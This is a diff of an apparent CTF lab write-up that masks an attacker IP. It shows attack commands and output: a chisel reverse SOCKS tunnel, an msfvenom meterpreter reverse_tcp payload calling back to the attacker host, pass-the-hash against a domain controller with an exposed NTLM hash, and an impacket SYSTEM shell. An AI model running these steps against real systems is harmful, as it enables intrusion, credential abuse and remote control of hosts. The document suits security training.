@@ -185,9 +185,9 @@ root@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 91
 2025/01/31 17:55:50 server: Listening on http://0.0.0.0:9111
 
 # trget
-(remote) root@ubuntu-web01:/tmp# ./chisel_1.10.1_linux_amd64 client 8.129.29.180:9111 R:0.0.0.0:10000:socks &
+(remote) root@ubuntu-web01:/tmp# ./chisel_1.10.1_linux_amd64 client 8.***.***.180:9111 R:0.0.0.0:10000:socks &
 [1] 20471
-2025/01/31 17:56:11 client: Connecting to ws://8.129.29.180:9111
+2025/01/31 17:56:11 client: Connecting to ws://8.***.***.180:9111
 2025/01/31 17:56:12 client: Connected (Latency 49.587197ms)
 ```
 
@@ -196,7 +196,7 @@ root@jmt-projekt:~# ./tools/chisel_1.10.1/chisel_1.10.1_linux_amd64 server -p 91
 启动 msfconsole 之后，先将入口点上线 msf
 
 ```bash
-root@jmt-projekt:~/tools# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=8.129.29.180 LPORT=9999 -f elf > 8.129.29.180.9999.elf
+root@jmt-projekt:~/tools# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=8.***.***.180 LPORT=9999 -f elf > 8.***.***.180.9999.elf
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -265,13 +265,8 @@ RHOSTS => 172.22.1.21
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
-[proxychains] Strict chain  ...  8.129.29.180:10000  ...  172.22.1.2:445  ...  OK
-[proxychains] Strict chain  ...  8.129.29.180:10000  ...  172.22.1.2:135  ...  OK
 SMB         172.22.1.2      445    DC01             [*] Windows Server 2016 Datacenter 14393 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:True)
-[proxychains] Strict chain  ...  8.129.29.180:10000  ...  172.22.1.2:445  ...  OK
 SMB         172.22.1.2      445    DC01             [+] xiaorang.lab\administrator:10cf89a850fb1cdbe6bb432b859164c8 (Pwn3d!)
-[proxychains] Strict chain  ...  8.129.29.180:10000  ...  172.22.1.2:135  ...  OK
-[proxychains] Strict chain  ...  8.129.29.180:10000  ...  172.22.1.2:49668  ...  OK
 SMB         172.22.1.2      445    DC01             [+] Executed command
 SMB         172.22.1.2      445    DC01             ___   ___
 SMB         172.22.1.2      445    DC01             \\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) )
@@ -298,7 +293,7 @@ SMB         172.22.1.2      445    DC01             Unbelievable! ! You found th
 [proxychains] DLL init: proxychains-ng 4.17
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
-[proxychains] Strict chain  ...  8.129.29.180:10000  ...  172.22.1.2:445  ...  OK
+[proxychains] Strict chain  ...  8.***.***.180:10000  ...  172.22.1.2:445  ...  OK
 [!] Launching semi-interactive shell - Careful what you execute
 C:\Windows\system32>whoami
 nt authority\system
